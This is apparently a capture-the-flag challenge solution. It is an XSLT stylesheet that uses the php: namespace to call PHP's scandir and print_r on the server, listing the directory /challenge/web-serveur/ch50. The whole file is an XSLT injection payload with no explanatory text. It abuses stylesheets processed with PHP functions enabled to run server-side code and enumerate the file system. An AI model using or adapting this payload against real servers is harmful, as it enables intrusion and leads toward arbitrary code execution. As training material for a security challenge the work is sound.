<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <pre>
<xsl:value-of select="php:function('print_r', php:function('scandir', '/challenge/web-serveur/ch50'), true())"/>
    </pre>
  </xsl:template>
</xsl:stylesheet>
